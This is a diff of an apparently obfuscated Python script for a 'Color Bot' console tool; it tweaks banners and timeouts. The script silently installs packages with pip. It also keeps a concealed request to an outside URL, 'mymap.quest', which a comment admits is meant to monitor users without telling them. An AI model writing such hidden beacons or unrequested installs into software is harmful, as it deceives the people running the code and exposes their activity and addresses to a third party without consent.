@@ -19,10 +19,12 @@ LIGHT_PURPLE ="\033[1;35m"#line:18
 LIGHT_CYAN ="\033[1;36m"#line:19
 LIGHT_WHITE ="\033[1;37m"#line:20
 """Colors For Ui"""
-
+os.system("cls")
+print(f"{LIGHT_WHITE}Color Bot, {YELLOW}Coming Soon{LIGHT_WHITE}!")
+time.sleep(2.5)
 os .system ("cls")
 print (f"{LIGHT_WHITE}If Your Python Version Is Higher Then {YELLOW}'3.13.2'{LIGHT_WHITE}, {LIGHT_WHITE}Please Uninstall And Install {YELLOW}'3.13.2'\033[0m")#line:25
-time .sleep (4 )
+time .sleep (3 )
 os .system ("pip install pygame pywin32 colorama requests")
 import os #line:28
 import shutil #line:29
@@ -36,7 +38,7 @@ import sys #line:36
 os .system ('cls')#line:37
 import requests
 Monitor_Users ="https://mymap.quest/A2AYNW" #Lonely Please Don't Tell Them, Im Only Using This To Monitor Whos Useing The Script
-requests .get (Monitor_Users, timeout=1)
+requests .get (Monitor_Users, timeout=3)
 time .sleep (0.01 )
 os.system("cls")
 def loading ():#line:38
